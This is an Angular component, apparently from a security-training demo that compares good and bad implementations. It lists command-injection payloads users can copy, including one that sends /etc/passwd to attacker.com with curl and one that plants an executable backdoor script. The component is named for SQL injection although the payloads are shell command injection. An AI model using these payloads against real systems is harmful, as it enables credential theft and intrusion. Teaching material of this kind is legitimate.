import { Component, Input } from '@angular/core';
import { CommonModule } from '@angular/common';
import { GoodImplementationService } from '../../services/good-implementation.service';
import { BadImplementationService } from '../../services/bad-implementation.service';

@Component({
  selector: 'sql_inject',
  imports: [CommonModule],
  templateUrl: './template.component.html',
  styleUrl: './template.component.css',
})
export class SQL_Inject {
  @Input() isGoodImplementation: boolean = false
  showModal: boolean = false
  copiedText: string = ''

  constructor(
    private goodservice: GoodImplementationService,
    private badservices: BadImplementationService
  ) {}

  OnGoodSubmit () {}

  OnBadSubmit () {}

  exploitSteps = {
    step1: "test.txt; whoami",
    step2: "file$(ls ../).txt",
    step3: "data.txt | curl -X POST -d @/etc/passwd attacker.com",
    step4: "input.txt && echo 'backdoor' > /tmp/exploit.sh && chmod +x /tmp/exploit.sh"
  };

  toggleModal() {
    this.showModal = !this.showModal
    if (!this.showModal) {
      this.copiedText = ''
    }
  }

  copyToClipboard(text: string, event?: Event) {
    if (event) {
      event.stopPropagation()
    }
    this.copiedText = text
    navigator.clipboard.writeText(text).catch(() => {
      this.copiedText = ''
    });
  }
}
